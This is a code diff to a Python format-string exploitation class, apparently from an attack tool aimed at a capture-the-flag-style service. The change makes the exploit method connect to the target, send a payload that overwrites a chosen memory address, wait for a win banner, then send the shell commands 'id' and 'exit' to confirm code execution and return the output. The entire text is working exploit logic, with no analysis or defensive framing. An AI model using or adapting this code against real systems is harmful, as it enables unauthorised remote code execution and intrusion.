@@ -597,7 +597,7 @@ class FormatStringExploit:
         Perform the classic format string exploit.
         :param address_overwrite: The address to overwrite
         :param address_wanted: The address to write to
-        :return: The payload to send to the target service
+        :return: The response from the target service if not interactive, otherwise None
         """
         if self.offset is None:
             raise ValueError("Offset not set. Call find_offset() first.")
@@ -605,23 +605,31 @@ class FormatStringExploit:
         if self.verbose:
             print(f"Using offset: {self.offset}, Stack alignment: {self.stack_alignment}")
 
+        self.dispatcher.connect()
+
         # Generate the payload to overwrite the address
         payload = self.return_payload(address_overwrite, address_wanted)
 
         # Send the payload to the target service
-        self.dispatcher.send_command(payload)
+        self.dispatcher.send_command(payload, get_return=False)
 
         if interactive:
             # Start an interactive session with the target service
             self.dispatcher.interactive()
             self.dispatcher.close()
         else:
+            self.dispatcher.receive_response("Yeah dude ! You win !\n", close_process=False)
+            self.dispatcher.client.p.send(b"id\nexit\n")
+            response = self.dispatcher.receive_response(close_process=False)
+            if self.verbose:
+                print(f"Response after exploit (execute `id`): {response}")
             # Close the connection if not in interactive mode
             self.dispatcher.close()
+            return response
 
         if self.verbose:
             print(f"Payload sent: {payload}")
 
-        return payload
+        return None
     
     # endregion
